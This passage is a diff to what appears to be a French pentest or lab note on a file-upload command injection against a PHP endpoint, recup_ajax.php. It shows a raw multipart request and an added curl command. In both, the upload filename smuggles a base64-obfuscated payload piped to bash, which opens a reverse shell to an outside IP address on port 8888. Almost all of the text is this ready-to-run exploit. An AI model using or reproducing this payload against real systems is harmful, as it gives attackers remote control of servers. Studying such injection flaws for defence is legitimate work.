@@ -150,12 +150,27 @@ Content-Disposition: form-data; name="type"
 
 PLAN
 ------WebKitFormBoundary7MA4YWxk
-Content-Disposition: form-data; name="fichiers[]"; filename="image.png\"; echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8yMTIuMTI5LjkuMTkvODg4OCAwPiYxJw== | base64 -d | bash\".png"
+Content-Disposition: form-data; name="fichiers[]"; filename="image.\"; echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8yMTIuMTI5LjkuMTkvODg4OCAwPiYxJw== | base64 -d | bash\".png"
 Content-Type: image/png
 
 AAAA
 ------WebKitFormBoundary7MA4YWxk--
 ```
+
+ou 
+
+```
+echo -n "AAAA" > file.png
+
+curl -X POST http://cible.com/recup_ajax.php \
+  -H "Cookie: PHPSESSID=xxxx" \
+  -F 'fonction=addFichiersEvenementChantier' \
+  -F 'evenement=test' \
+  -F 'commentaires=test' \
+  -F 'type=PLAN' \
+  -F 'fichiers[]=@file.png;filename="image.\"; echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8yMTIuMTI5LjkuMTkvODg4OCAwPiYxJw== | base64 -d | bash\".png";type=image/png'
+```
+
 
 ![[Pasted image 20260421154427.png]]
 
